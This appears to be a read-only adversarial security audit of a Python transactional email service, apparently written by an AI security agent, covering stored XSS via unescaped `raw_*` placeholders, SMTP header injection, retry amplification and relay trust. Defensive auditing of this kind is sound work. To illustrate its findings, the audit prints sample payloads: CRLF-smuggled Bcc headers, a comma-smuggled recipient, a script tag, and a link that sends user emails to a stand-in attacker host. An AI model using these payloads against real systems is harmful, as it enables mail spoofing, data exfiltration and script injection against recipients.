# Adversarial Audit — `gateway/email_system/service.py`

**Scope:** `gateway/email_system/service.py` (289 lines) and its immediate
collaborators (`renderer.py`, `unsubscribe.py`, `jobs/email_jobs.py`,
`jobs/backend.py`, admin override path in `admin_routes.py`).
**Date:** 2026-05-15.
**Mode:** Adversarial — assumptions of malice for every input that crosses
a trust boundary (recipient address, template context, admin override body,
relay URL env, attachment paths).
**Author:** Claude security agent (one-shot).
**Output rule:** read-only audit. No code changes.

---

## Severity counts

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High     | 3 |
| Medium   | 4 |
| Low      | 3 |
| Info     | 2 |
| **Total**| **12** |

## Top 3 (by exploitability × blast radius)

1. **H-1 — Admin-template stored XSS via `raw_*` substitution.** `_substitute()`
   in `service.py:233-244` returns unescaped HTML when the placeholder key
   starts with `raw_`. An admin (or any actor with `admin_routes.email_save`
   access — protected only by `_require_admin_user`) can persist a body
   containing `{{ raw_unsubscribe_token }}` etc. and have it rendered into
   every recipient's mailbox unescaped. The admin save path
   (`admin_routes.py:763-771`) writes `body_html` verbatim with no
   sanitization, no allow-list, no CSP. One compromised or coerced admin
   = persistent HTML/JS injection into every transactional email,
   including 2FA codes and password-reset links — prime phishing payload.

2. **H-2 — SMTP header injection via `from_name` / `reply_to`.**
   `_send_via_smtp()` builds the From header as
   `f"{self.from_name} <{self.from_address}>"` (line 171) and assigns
   `reply_to` directly into `msg["Reply-To"]` (line 174) without rejecting
   CR/LF. `EMAIL_FROM_NAME` is an env var (trusted) but `reply_to` flows in
   from every caller — `enqueue_email(reply_to=...)` accepts a `str | None`
   with no validation, and several callers (newsletter, enquiry, referral)
   pass user-influenced data. Python 3's `email.message.EmailMessage`
   does have some defenses, but `\r\n` smuggling through
   `add_header`-equivalent paths has surfaced repeatedly in CPython
   advisories; relying on it without an explicit sanitization step is a
   sharp edge. Combined with the relay path (which copies `replyTo` into
   a JSON body the worker forwards into MailChannels) the same payload
   can poison both transports.

3. **H-3 — Retry amplification & queue poisoning by crafted recipient.**
   `EmailService.send()` is explicitly designed never to raise, returning
   `False` on every failure (lines 70-74, 159-162, 187-188). But
   `send_email_job` in `jobs/email_jobs.py:50-51` translates `False` into
   `raise RuntimeError(...)`, and the in-process backend
   (`jobs/backend.py:161-179`) retries any raise three times with
   exponential backoff. A malicious recipient `to=` value (oversized
   string, embedded NUL, IDN homograph, mailbox-exhausting RCPT TO) that
   the upstream MTA hard-rejects produces three full re-renders of the
   template per job, each one re-fetching the admin override row and
   re-rendering Jinja-style blocks. Because `enqueue_email` is called
   from public endpoints (the enquiry form, newsletter confirm,
   referral invite) with the form-supplied email, an attacker who
   guesses or learns valid `enquiry_email` / referrer flows can amplify
   their requests 3× into the queue and waste both worker time and
   relay credits. There is no per-recipient or per-IP throttling at the
   `EmailService` layer, and no jitter on the backoff (predictable
   2/4/8s) — easy to align with relay rate limits to trigger relay
   blacklisting of your sending domain.

---

## Threat model recap

For each attacker vector specified in the brief:

| Vector | Verdict |
|--------|---------|
| SSRF in webhook callbacks | **No webhook callbacks in `service.py`.** The relay is an outbound POST to a configured env URL only. SSRF surface is M-2 (relay URL config trust). |
| Header injection via display-name | **Real (H-2).** From-name comes from env (low risk), but `reply_to` and the relay JSON body are not CRLF-stripped. |
| Attachment path traversal | **No attachment support in `service.py`.** The `send()` API has no attachment parameter. (Info-1 — should stay this way.) |
| Template variable XSS (HTML email) | **Real (H-1, M-1).** `raw_*` prefix is documented as unescaped; admin overrides + welcome variant flags accept the same `raw_` key namespace. |
| Retry loop unbounded | **Bounded but amplifying (H-3, M-3).** Hard cap of 3 attempts, but the backoff is naive and the re-render path is expensive. |
| Queue poisoning via crafted recipient | **Real (H-3, M-4).** No recipient validation at the EmailService boundary; the queue accepts any string. |

---

## Findings — full

### H-1 (High): Stored XSS via `raw_*` placeholder in admin overrides

**Where:** `gateway/email_system/service.py:224-244` (`_substitute`),
called from `_resolve_admin_override` at `service.py:247-271` and from
`render_preview` at `service.py:274-289`.

**Vulnerable code:**
```python
def repl(m):
    key = m.group(1).strip()
    raw = key.startswith("raw_")
    if key not in ctx:
        return ""
    value = ctx.get(key)
    if value is None:
        return ""
    value = str(value)
    return value if raw else _html.escape(value)
```

The convention is inherited from `gateway/render_page` and is well-known
to the team. **The issue is not the convention itself — it is that the
admin-saved `body_html` is treated as trusted HTML AND can reference
context keys whose values are derived from user-controlled fields.**

Concretely:
- `body_html` is stored verbatim from `admin_routes.email_save()` at
  `admin_routes.py:760-771`. No bleach, no allowlist, no CSP header on
  the rendered email.
- The same body is also previewed live in the admin editor (the editor
  fetches `render_preview` on every keystroke — `service.py:274-289`)
  and rendered into a sandboxed iframe (per comment at
  `admin_emails_routes.py:568`). The **send path is not sandboxed.**
- The render context for several templates includes user-supplied
  strings (e.g. `enquiry_email`, `message`, `display_name`,
  `subproduct_name`). A welcome override of the form
  `<p>Hi {{ raw_display_name }}</p>` will render a `display_name` that
  came from the `username` column without escaping.

**Exploit path A (admin → all-users):** An admin account is compromised
(or an insider goes rogue), the admin pushes `{% raw_unsubscribe_url %}`
or a literal `<script>` into the active `password_reset` template. Every
subsequent password-reset email contains the script. Because rendered
HTML is sent via the relay or SMTP, most mail clients will sanitize, but
**webmail forwarders, custom MUAs, and the in-app "view sent email"
admin panel** will execute it. The admin preview pane is sandboxed but
the audit/log panel may not be.

**Exploit path B (user → user, via context leakage):** If any template's
context contains a user-controlled field rendered via a `raw_` key, that
field becomes a stored-XSS sink. Today the file templates don't appear
to use `raw_` for user fields, but the admin can override any template
and choose any key name — including `raw_display_name`,
`raw_enquiry_email`, `raw_message`. Once stored, every recipient gets
the XSS.

**Why the team's mitigations don't fully cover this:**
- Sandbox iframe (admin preview) does not protect actual email
  recipients.
- HTML escape in the non-`raw_` branch is correct but bypassable by
  simply prefixing the key with `raw_`.
- `render_preview` swallows exceptions (`return {"subject": f"[preview
  error: {exc}]", ...}`) — admin can craft an override that renders
  fine in preview but explodes downstream, never noticing.

**Recommendation:**
- Drop the `raw_*` convention from admin-editable templates entirely.
  Force `_substitute` to always escape when invoked from the admin
  override path. Keep `raw_` only inside the renderer for trusted
  built-in templates (`renderer.py`).
- Bleach the saved `body_html` on `upsert_email_template` with a strict
  allowlist (no `<script>`, no inline event handlers, no `javascript:`
  URLs).
- Add a Content-Security-Policy meta to base.html (limited support but
  blocks some webmail XSS).
- Record an audit event whenever `raw_` shows up in a saved admin
  template body and alert.

---

### H-2 (High): SMTP / relay header injection via Reply-To and From-name

**Where:**
- SMTP path: `service.py:169-176`.
- Relay path: `service.py:142-154` (`replyTo` field forwarded into the
  worker as JSON).

**Vulnerable code (SMTP):**
```python
msg = EmailMessage()
msg["Subject"] = subject
msg["From"] = f"{self.from_name} <{self.from_address}>"
msg["To"] = to
if reply_to:
    msg["Reply-To"] = reply_to
```

`subject`, `from_name`, `to`, and `reply_to` are all assigned to header
fields without explicit CR/LF scrubbing. Python 3's
`email.message.EmailMessage` does perform header-injection rejection
(`policy.default` requires structured values), but:

1. `from_name` is interpolated into a string before being passed to
   `EmailMessage`. A `from_name` of `"narve.ai\r\nBcc: attacker@evil"`
   produces a header with a literal newline — the policy *should* raise,
   but only because of trailing structured parsing. The trust here is on
   the env var, not on policy enforcement. Worth tightening.

2. `reply_to` reaches `msg["Reply-To"]` directly. Several callers pass
   user-influenced values: e.g. the support routes and the enquiry
   notification (when an admin replies to an enquiry, the user's email
   becomes the reply-to). An attacker who registers an account with an
   email like `attacker@evil\r\nBcc: leak@attacker.example` exploits
   any callsite that uses their email as `reply_to`. The CPython policy
   *should* catch this but historically has had bypasses with folded
   whitespace, encoded-word smuggling, and Unicode line separators
   (U+2028/U+2029). Defense in depth is missing.

3. **Relay path bypasses CPython header policy entirely.** `replyTo`
   is forwarded as a JSON string field. The MailChannels Worker
   composes the SMTP message; whether *it* sanitizes is outside this
   audit. If the worker echoes the JSON field into the header verbatim,
   the same CRLF payload is exploitable end-to-end.

**Recommendation:**
- Reject any header-bound string containing `\r`, `\n`, `\x00`, U+2028,
  U+2029. Add `_safe_header(s)` and apply to `subject`, `from_name`,
  `to`, `reply_to` at the EmailService boundary.
- Validate `to` is a single RFC 5322 addr-spec (no commas, no group
  syntax). The current code passes the raw string straight to
  `EmailMessage["To"]` — if a caller passes `"alice@x, bob@y"` the
  message goes to both, which is queue-poisoning fuel (H-3).
- Document the trust boundary at the relay JSON layer; ask whether the
  MailChannels Worker validates `replyTo`.

---

### H-3 (High): Retry amplification + queue poisoning via recipient

**Where:**
- `jobs/email_jobs.py:50-51` (False → raise).
- `jobs/backend.py:161-179` (3 attempts, fixed `2 ** attempt` backoff).
- `service.py:44-74` (no recipient validation at the EmailService
  boundary).
- `enqueue_email` callers in `public_routes.py:101`,
  `routes_referrals.py:167`, `webhooks.py:387` — all forward
  user-supplied or webhook-supplied email strings.

**Why it's exploitable:**

1. `send()` accepts `to: str` with no validation. A `to` of length 50k,
   a `to` with embedded NUL, or a `to` containing CRLF (header
   injection per H-2) all flow through. The relay/SMTP layer will
   reject most, returning False, which becomes a raise, which becomes
   a retry. **3× re-render, 3× admin template DB hit, 3× MailChannels
   call** per attacker request.

2. The `render()` path on each retry re-loads `base.html` and the
   child template from disk (`renderer.py:_load` reads the file every
   call — no in-process cache) and re-evaluates the entire regex-based
   `_render_blocks` + `_render_vars`. For the digest/morning briefing
   with long lists, that is an O(n × templates) regex spin per retry.

3. `_resolve_admin_override` re-queries `db.get_email_template` on
   every retry (no caching). An attacker who can trigger many failing
   sends drives DB IOPS up.

4. Backoff is `2 ** attempt` (2s, 4s, 8s) with **no jitter** — easy to
   queue many attacker requests so the retries cluster against
   MailChannels' rate window and get the sending domain throttled or
   reputation-flagged. The relay never receives a circuit breaker
   signal.

5. No per-recipient or per-IP rate limit at the queue or service
   boundary. `public_routes.py:101` (enquiry form) is rate-limited at
   the HTTP layer (separate audit) but `routes_referrals.py:167` and
   `stripe_webhook_hardening.py:344` are not obviously rate-limited
   against attacker control of email values.

**Recommendation:**
- Validate `to` at the EmailService boundary: RFC 5322 single
  addr-spec, length ≤ 254, no control chars. Reject hard before any
  transport.
- Distinguish *retryable* (network, 5xx) from *permanent* (4xx, malformed
  recipient) failures. Raise only on retryable. Have `send_email_job`
  return `{"skipped": True, "reason": "..."}` on permanent failures so
  the backend stops retrying immediately.
- Add jitter to backoff (`2 ** attempt + random.uniform(0, 2)`).
- Per-recipient dedup window in the queue: if the same `(to, template,
  context_hash)` was tried in the last 60s, drop the job.
- Cache `base.html` and child templates in-process; cache
  `get_email_template` for at least a few seconds.

---

### M-1 (Medium): Admin template `_substitute` is silently lossy on missing keys

**Where:** `service.py:236-237`.

```python
if key not in ctx:
    return ""
```

Missing context keys silently render to empty string. Combined with H-1,
this is the engine behind an exfiltration trick: an attacker who
controls an admin-template body and a context dict can build
`<a href="https://attacker.example/?u={{ raw_user_email }}">` and have
it fail-soft to empty when the key is missing in some contexts (no
template render error → no alert) while leaking aggressively when the
key is present. The team will see a "working" template and miss the
data-exfil ones.

Also: `render_preview` defaults missing keys to `"Sample {v}"` — divergence
between preview and send. Admin sees a placeholder, recipient sees the
real value. Phishing template authors can hide payload behavior from
preview.

**Recommendation:**
- Log a warning every time a key is missing.
- Make preview use the same `return ""` semantics or make send raise on
  missing keys (and surface in admin UI).

---

### M-2 (Medium): Relay URL / secret are env-trusted with no integrity check

**Where:** `service.py:39-40, 134-162`.

```python
self.relay_url = os.environ.get("EMAIL_RELAY_URL", "").strip()
self.relay_secret = os.environ.get("EMAIL_RELAY_SECRET", "").strip()
...
async with httpx.AsyncClient(timeout=httpx.Timeout(10.0)) as client:
    resp = await client.post(self.relay_url, json=body, headers=headers)
```

Not an SSRF in the traditional sense (the URL isn't user-controlled at
runtime), but:

1. **No URL scheme/host validation.** If someone fat-fingers
   `EMAIL_RELAY_URL=http://169.254.169.254/latest/meta-data` (cloud
   metadata, AWS) or `http://127.0.0.1:8080/`, the service will happily
   POST the rendered HTML — including watermarked Pro intel and password
   reset links — to that endpoint every time anyone tries to send.
2. **No TLS-only enforcement.** `http://` is accepted; relay secret is
   transmitted in clear-text Bearer header.
3. **No follow-redirect protection.** httpx defaults to no redirects,
   which is good, but worth pinning explicitly with
   `follow_redirects=False`.
4. **No hostname pin / DNS rebinding protection.** If the relay's DNS
   is hijacked or rebound, the worker dispatches user PII (every email
   body) to the attacker. Pinning to a known IP range or using mTLS
   would help.
5. **Timeout is 10s total, not per-stage.** A slowloris-style attacker
   controlling the relay can hold the connection open for 10s per
   email, exhausting the worker concurrency limit
   (`max_concurrent=10` in `jobs/backend.py:142`). At full saturation,
   the entire job backend stalls.

**Recommendation:**
- Validate `EMAIL_RELAY_URL` at boot: must be `https://`, host must
  not be a private/link-local IP, must not be metadata range.
- Set `follow_redirects=False` explicitly.
- Use per-stage timeouts (connect, write, read) or a smaller total.
- Pin TLS via `httpx.create_ssl_context(cafile=...)` if the relay
  uses a private CA.

---

### M-3 (Medium): SMTP/relay credentials may leak via `resp.text[:200]` and exception messages

**Where:** `service.py:158, 161, 187`.

```python
log.warning("relay returned %d: %s", resp.status_code, resp.text[:200])
...
except Exception as e:
    log.warning("relay send failed: %s", e)
```

The relay's error responses are echoed into application logs. If the
relay (or a stub the attacker stood up — see M-2) returns 4xx with a
body that includes the Bearer secret echoed back, or if the worker's
error includes the URL with secret in a query string, those secrets
end up in log aggregation.

`smtp_password` is interpolated into `server.login(...)`; if `smtplib`
fails to upgrade TLS, the password may be transmitted plaintext over a
hijacked downgrade. `_send_via_smtp` calls `server.starttls(...)` but
does not enforce STARTTLS success (Python's smtplib will raise on
failure, which is caught by the broad `except Exception` and turned
into `log.warning("smtp send failed: %s", e)` — so an MITM attacker can
trigger STARTTLS failure to force plaintext fallback if the SMTP
server allows AUTH PLAIN over plain text).

Wait — re-read: `with smtplib.SMTP(...)` is plain SMTP. If the STARTTLS
call raises, the `with` block tears down. But `server.login` is called
**only after** starttls; if starttls returns success but the channel
is not actually encrypted (downgrade), AUTH is over plaintext. Standard
risk for any STARTTLS-only path. Worth a flag.

**Recommendation:**
- Truncate `resp.text` to 200 chars *and* redact common secret patterns
  (`Bearer `, `Authorization`, `password=`).
- Set `smtplib.SMTP(...).ehlo()` then assert STARTTLS is offered, then
  call starttls; refuse to send if not.
- Or prefer `smtplib.SMTP_SSL` for the implicit TLS port.

---

### M-4 (Medium): Recipient list is a single `str`, but multiple addresses are accepted

**Where:** `service.py:46`, SMTP path at line 172.

`to: str` is passed straight to `msg["To"] = to`. If an attacker manages
to enqueue `to="victim@example.com, bcc-leak@attacker.example"`, the
SMTP path will deliver to **both**. Several callers join values without
checking commas. `_send_via_relay` passes `to` straight to MailChannels
which may also accept multiple addresses depending on the worker.

Combined with H-2 header injection, an attacker can fan one job out to
arbitrary recipients including Bcc.

**Recommendation:**
- Enforce single-recipient invariant: reject if `to` contains `,`, `;`,
  whitespace inside the local part, or more than one `@`.
- If multi-recipient sends are needed (digest fan-out), build a real
  list parameter and iterate explicitly.

---

### L-1 (Low): `render_text_fallback` is regex HTML stripping — script payload survives in plaintext

**Where:** `service.py:127`, `renderer.py:155-162`.

```python
text = re.sub(r"<[^>]+>", "", text)
```

This strips tags but does *not* strip the contents of `<script>` or
`<style>`. The plaintext fallback of a `<script>alert(1)</script>` body
becomes `alert(1)`. Harmless visually but encodes attacker-controlled
strings in the plaintext alternative. Combined with H-1, an attacker
who landed a stored XSS body also lands payload text in the plaintext
mime part, which some email clients display preferentially.

**Recommendation:**
- Strip `<script>...</script>` and `<style>...</style>` blocks before
  the tag-stripper.
- Or use `html2text` / a vetted library.

---

### L-2 (Low): `app_url` env is unvalidated and reaches every template link

**Where:** `service.py:42`, used as `ctx.setdefault("app_url", self.app_url)`.

```python
self.app_url = os.environ.get("APP_URL", "https://narve.ai")
```

If `APP_URL` is set to a malicious URL (operator error, supply-chain
config injection, or env leak), **every** outbound email's links point
to the attacker. There is no scheme/host pinning. The default is
correct but the env var has no validation.

**Recommendation:**
- Validate at boot: must be `https://`, must end without a trailing
  slash, hostname pinned to a known set.

---

### L-3 (Low): Tags list is unbounded and unvalidated

**Where:** `service.py:51` (`tags: Optional[list] = None`).

Tags flow through to the relay JSON body. No length cap, no element
type check. An attacker who controls a caller can pass a 1MB tag list
and inflate every relay POST.

**Recommendation:**
- Cap `len(tags) <= 16`, cap each tag to 64 chars, strings only.

---

### Info-1: No attachment support — keep it that way

`EmailService.send()` has no `attachments=` parameter, and
`_send_via_smtp` does not call `add_attachment`. The relay JSON body
does not carry attachments either. **There is no path traversal because
there is no path.** This is the right design for an outbound-only
transactional service. If/when attachments are added (e.g. for the
data-export ready email — see `exports/generator.py:955`), the path
parameter MUST be:

- Resolved against a single permitted base directory.
- Validated with `pathlib.Path.resolve()` then a startswith check
  against the base.
- Size-capped before being read into memory.

Today the data-export flow generates a download URL rather than
attaching, which is correct. Keep that pattern.

---

### Info-2: No unsubscribe enforcement at the EmailService layer

`UnsubscribeManager.unsubscribe()` (verified HMAC-signed tokens, good)
records unsubscribes. But `EmailService.send()` does not check the
unsubscribe table — that responsibility is pushed up to callers
(`jobs/email_jobs.py` digest batch query has
`AND u.email_unsubscribed_at IS NULL`, but ad-hoc admin sends and
transactional flows do not). A bug at any caller = unsubscribe bypass.

**Recommendation:**
- Add a final unsubscribe check inside `EmailService.send()` keyed off
  template tags (e.g. `tags=["digest"]` consults `email_digest`; no tag
  = transactional and unsubscribe is bypassed by design).

---

## Out of scope / not findings

- The relay HMAC/Bearer is a config concern handled by ops, not
  `service.py`.
- `webhooks.py` uses `enqueue_email` in a fire-and-forget pattern; the
  webhook signature verification is audited separately.
- Watermarking (`email_system/watermark.py`) and unsubscribe HMAC
  signing (`unsubscribe.py`) appear correctly implemented — HMAC-SHA256
  with `compare_digest`, signature includes email + scope.
- Tests for the override path exist
  (`tests/test_email_template_overrides.py`) but do not cover
  `raw_*` XSS, header injection, or oversized recipient.

## File index (load-bearing line numbers)

- `/Users/shocakarel/Habbig/gateway/email_system/service.py:171-176` —
  SMTP From/Reply-To assignment (H-2)
- `/Users/shocakarel/Habbig/gateway/email_system/service.py:233-244` —
  `_substitute` raw_ branch (H-1, M-1)
- `/Users/shocakarel/Habbig/gateway/email_system/service.py:247-271` —
  admin override loader (H-1)
- `/Users/shocakarel/Habbig/gateway/email_system/service.py:134-162` —
  relay POST (M-2, M-3)
- `/Users/shocakarel/Habbig/gateway/email_system/service.py:44-74` —
  `send()` entry, no recipient validation (H-3, M-4)
- `/Users/shocakarel/Habbig/gateway/email_system/renderer.py:155-162` —
  text fallback regex (L-1)
- `/Users/shocakarel/Habbig/gateway/jobs/email_jobs.py:50-51` —
  False→raise (H-3)
- `/Users/shocakarel/Habbig/gateway/jobs/backend.py:161-179` —
  retry loop (H-3)
- `/Users/shocakarel/Habbig/gateway/admin_routes.py:763-771` —
  `body_html` saved verbatim (H-1)
